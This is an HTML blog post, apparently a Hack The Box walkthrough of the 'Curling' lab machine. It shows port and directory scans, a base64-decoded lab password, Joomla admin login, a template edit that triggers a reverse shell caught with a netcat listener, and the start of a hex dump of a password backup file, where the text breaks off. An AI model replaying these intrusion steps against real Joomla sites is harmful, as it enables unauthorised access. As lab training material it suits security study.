@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  HTB: Curling Writeup · mattjohnson.cloud
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="matt johnson">
+<meta name="description" content="Here&#39;s how to solve HackTheBox&#39;s Curling.">
+<meta name="keywords" content="blog,cloud,personal,security,windows,chess">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Curling Writeup">
+  <meta name="twitter:description" content="Here&#39;s how to solve HackTheBox&#39;s Curling.">
+
+<meta property="og:url" content="http://www.mattjohnson.de/posts/htb-curling/">
+  <meta property="og:site_name" content="mattjohnson.cloud">
+  <meta property="og:title" content="HTB: Curling Writeup">
+  <meta property="og:description" content="Here&#39;s how to solve HackTheBox&#39;s Curling.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-04-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-04-28T00:00:00+00:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="Security">
+
+
+
+
+<link rel="canonical" href="http://www.mattjohnson.de/posts/htb-curling/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.7763f8bc6341ecf82378e867c285e1549abb063a899be313ccd25dbfcd24fa7d.css" integrity="sha256-d2P4vGNB7PgjeOhnwoXhVJq7BjqJm&#43;MTzNJdv80k&#43;n0=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://www.mattjohnson.de/">
+      mattjohnson.cloud
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">about</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">tags</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://www.mattjohnson.de/posts/htb-curling/">
+              HTB: Curling Writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2020-04-28T00:00:00Z">
+                April 28, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              10-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/matt-johnson/">Matt Johnson</a></div>
+
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/hackthebox/">Hackthebox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/security/">Security</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <div class="custom-toc">
+    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#high-level-information">High-Level Information</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ol>
+</nav>
+</div>
+<h1 id="high-level-information">
+  High-Level Information
+  <a class="heading-link" href="#high-level-information">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Machine Name: Curling</p>
+<p>IP Address: 10.10.10.150</p>
+<p>Difficulty: Easy</p>
+<p>Summary: How difficult HackTheBox&rsquo;s Curling is highly depends on how well you enumerate the box. In my case, it ended up being relatively simple. Inspecting the source code reveals a hidden file from which I derived the password to the Joomla admin panel. From there, I was able to get a shell as www-data. In order to gain access to Floris&rsquo; account, I decoded an &ldquo;encrypted&rdquo; (encoded) password backup file. Once I had those credentials, I exploited an SUID program running as a cronjob to get a root shell.</p>
+<p>Tools Used: Nmap, Curl, Gobuster</p>
+<h1 id="initial-foothold">
+  Initial Foothold
+  <a class="heading-link" href="#initial-foothold">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ sudo /opt/stagednmap.sh 10.10.10.150
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> matt:
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-04-18 17:35 CDT
+</span></span><span style="display:flex;"><span>Stats: 0:00:33 elapsed; <span style="color:#a5d6ff">0</span> hosts completed <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> up<span style="color:#ff7b72;font-weight:bold">)</span>, <span style="color:#a5d6ff">1</span> undergoing SYN Stealth Scan
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 8.52% <span style="color:#ff7b72">done</span>; ETC: 17:42 <span style="color:#ff7b72;font-weight:bold">(</span>0:05:54 remaining<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:08:07 elapsed; <span style="color:#a5d6ff">0</span> hosts completed <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> up<span style="color:#ff7b72;font-weight:bold">)</span>, <span style="color:#a5d6ff">1</span> undergoing SYN Stealth Scan
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 78.66% <span style="color:#ff7b72">done</span>; ETC: 17:45 <span style="color:#ff7b72;font-weight:bold">(</span>0:02:12 remaining<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.150
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.12s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65533</span> closed ports
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open ssh
+</span></span><span style="display:flex;"><span>80/tcp open http
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 640.07 seconds
+</span></span><span style="display:flex;"><span>Starting Nmap 7.80 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2020-04-18 17:46 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.10.10.150
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.12s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>PORT STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu <span style="color:#a5d6ff">4</span> <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">2048</span> 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca <span style="color:#ff7b72;font-weight:bold">(</span>RSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#a5d6ff">256</span> 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_ <span style="color:#a5d6ff">256</span> c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open http Apache httpd 2.4.29 <span style="color:#ff7b72;font-weight:bold">((</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">))</span>
+</span></span><span style="display:flex;"><span>|_http-generator: Joomla! - Open Source Content Management
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Home
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#a5d6ff">1</span> open and <span style="color:#a5d6ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 3.2 - 4.9 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.16 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.18 <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, ASUS RT-N56U WAP <span style="color:#ff7b72;font-weight:bold">(</span>Linux 3.4<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">(</span>95%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.1 <span style="color:#ff7b72;font-weight:bold">(</span>93%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.2 <span style="color:#ff7b72;font-weight:bold">(</span>93%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.10 - 4.11 <span style="color:#ff7b72;font-weight:bold">(</span>93%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.12 <span style="color:#ff7b72;font-weight:bold">(</span>93%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.13 <span style="color:#ff7b72;font-weight:bold">(</span>93%<span style="color:#ff7b72;font-weight:bold">)</span>, Linux 3.13 - 3.16 <span style="color:#ff7b72;font-weight:bold">(</span>93%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#ff7b72">for</span> host <span style="color:#ff7b72;font-weight:bold">(</span>test conditions non-ideal<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#a5d6ff">2</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#ff7b72;font-weight:bold">(</span>using port 443/tcp<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>HOP RTT ADDRESS
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">1</span> 125.05 ms 10.10.14.1
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span> 125.57 ms 10.10.10.150
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 18.73 seconds
+</span></span></code></pre></div><p>With only HTTP to enumerate, I moved on to inspecting the site and source code:</p>
+<p><img src="site-home.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ curl http://10.10.10.150
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html <span style="color:#79c0ff">lang</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;en-gb&#34;</span> <span style="color:#79c0ff">dir</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;ltr&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    &lt;!-- secret.txt --&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>matt@kali:~/htb/curling$ curl http://10.10.10.150/secret.txt
+</span></span><span style="display:flex;"><span>Q3VybGluZzIwMTgh
+</span></span></code></pre></div><p>The secret appeared to be a base64-encoded password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ echo <span style="color:#a5d6ff">&#34;Q3VybGluZzIwMTgh&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span>Curling2018!
+</span></span></code></pre></div><p>Moving on, I ran a gobuster scan against the site and ended up finding the Joomla administrator login page in the /administrator directory:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --threads <span style="color:#a5d6ff">50</span> --url http://10.10.10.150 -x php,txt
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.0.1
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#ff7b72;font-weight:bold">(</span>@TheColonial<span style="color:#ff7b72;font-weight:bold">)</span> &amp; Christian Mehlmauer <span style="color:#ff7b72;font-weight:bold">(</span>@_FireFart_<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Url: http://10.10.10.150
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Threads: <span style="color:#a5d6ff">50</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Status codes: 200,204,301,302,307,401,403
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> User Agent: gobuster/3.0.1
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Extensions: php,txt
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>+<span style="color:#ff7b72;font-weight:bold">]</span> Timeout: <span style="color:#79c0ff">10s</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/04/18 17:46:55 Starting <span style="color:#79c0ff">gobuster</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>/index.php <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/media <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/templates <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/modules <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/images <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/bin <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/plugins <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/includes <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/language <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/README.txt <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/components <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/cache <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/libraries <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/tmp <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/LICENSE.txt <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/layouts <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/secret.txt <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/administrator <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/configuration.php <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/htaccess.txt <span style="color:#ff7b72;font-weight:bold">(</span>Status: 200<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/cli <span style="color:#ff7b72;font-weight:bold">(</span>Status: 301<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/server-status <span style="color:#ff7b72;font-weight:bold">(</span>Status: 403<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span><span style="display:flex;"><span>2020/04/18 18:15:23 <span style="color:#79c0ff">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">===============================================================</span>
+</span></span></code></pre></div><p>Using the credentials &lsquo;floris:Curling2018!&rsquo;, I was able to get access to the admin panel:</p>
+<p><img src="joomla-admin-panel.png" alt=""></p>
+<p>From there, the path to getting a low shell on the box was to edit the template for index.php so that it would execute a reverse shell, visit the homepage, and catch the shell using netcat:</p>
+<p><img src="edit-template.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>matt@kali:~/htb/curling$ sudo nc -nvlp <span style="color:#a5d6ff">80</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> matt:
+</span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">80</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.105<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.10.10.150<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">59280</span>
+</span></span><span style="display:flex;"><span>Linux curling 4.15.0-22-generic <span style="color:#8b949e;font-style:italic">#24-Ubuntu SMP Wed May 16 12:15:17 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span>    03:12:01 up 4:37, <span style="color:#a5d6ff">0</span> users, load average: 0.00, 0.00, 0.00
+</span></span><span style="display:flex;"><span>USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>33<span style="color:#ff7b72;font-weight:bold">(</span>www-data<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#f85149">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>My initial analysis of the box didn&rsquo;t yield much, but browsing through /home/floris (which was world-readable) led me to a file called &lsquo;password_backup&rsquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ pwd
+</span></span><span style="display:flex;"><span>/home/floris
+</span></span><span style="display:flex;"><span>$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#a5d6ff">44</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">6</span> floris floris <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#a5d6ff">3</span> root root <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#a5d6ff">1</span> root root <span style="color:#a5d6ff">9</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#a5d6ff">1</span> floris floris <span style="color:#a5d6ff">220</span> Apr <span style="color:#a5d6ff">4</span> <span style="color:#a5d6ff">2018</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#a5d6ff">1</span> floris floris <span style="color:#a5d6ff">3771</span> Apr <span style="color:#a5d6ff">4</span> <span style="color:#a5d6ff">2018</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#a5d6ff">2</span> floris floris <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> .cache
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#a5d6ff">3</span> floris floris <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> .gnupg
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#a5d6ff">3</span> floris floris <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#a5d6ff">1</span> floris floris <span style="color:#a5d6ff">807</span> Apr <span style="color:#a5d6ff">4</span> <span style="color:#a5d6ff">2018</span> .profile
+</span></span><span style="display:flex;"><span>drwxr-x--- <span style="color:#a5d6ff">2</span> root floris <span style="color:#a5d6ff">4096</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> admin-area
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#a5d6ff">1</span> floris floris <span style="color:#a5d6ff">1076</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> password_backup
+</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#a5d6ff">1</span> floris floris <span style="color:#a5d6ff">33</span> May <span style="color:#a5d6ff">22</span> <span style="color:#a5d6ff">2018</span> user.txt
+</span></span><span style="display:flex;"><span>$ cat password_backup
+</span></span><span style="display:flex;"><span>00000000: 425a <span style="color:#a5d6ff">6839</span> <span style="color:#a5d6ff">3141</span> <span style="color:#a5d6ff">5926</span> <span style="color:#a5d6ff">5359</span> 819b bb48 <span style="color:#a5d6ff">0000</span> BZh91AY&amp;SY...H..
+</span></span><span style="display:flex;"><span>00000010: 17ff fffc 41cf 05f9 <span style="color:#a5d6ff">5029</span> <span style="color:#a5d6ff">6176</span> 61cc 3a34 ....A...P<span style="color:#ff7b72;font-weight:bold">)</span>ava.:4
+</span></span><span style="display:flex;"><span>00000020: 4edc cccc 6e11 <span style="color:#a5d6ff">5400</span> 23ab <span style="color:#a5d6ff">4025</span> f802 <span style="color:#a5d6ff">1960</span> N...n.T.#.@%...<span style="color:#a5d6ff">`</span>
+</span></span><span style="display:flex;"><span>00000030: <span style="color:#a5d6ff">2018</span> 0ca0 <span style="color:#a5d6ff">0092</span> 1c7a <span style="color:#a5d6ff">8340</span> <span style="color:#a5d6ff">0000</span> <span style="color:#a5d6ff">0000</span> <span style="color:#a5d6ff">0000</span> ......z.@......
+</span></span><span style="display:flex;"><span>00000040: <span style="color:#a5d6ff">0680</span> <span style="color:#a5d6ff">6988</span> <span style="color:#a5d6ff">3468</span> <span style="color:#a5d6ff">6469</span> 89a6 d439 ea68 c800 ..i.4hdi...9.h..
+</span></span><span style="display:flex;"><span>00000050: 000f 51a0 <span style="color:#a5d6ff">0064</span> 681a 069e a190 <span style="color:#a5d6ff">0000</span> <span style="color:#a5d6ff">0034</span> ..Q..dh........4
+</span></span><span style="display:flex;"><span>00000060: <span style="color:#a5d6ff">6900</span> <span style="color:#a5d6ff">0781</span> <span style="color:#a5d6ff">3501</span> 6e18 c2d7 8c98 874a 13a0 i...5.n......J..
+</span></span><span style="display:flex;"><span>00000070: <span style="color:#a5d6ff">0868</span> ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..<span style="color:#ff7b72;font-weight:bold">}</span>y..&lt;~.x
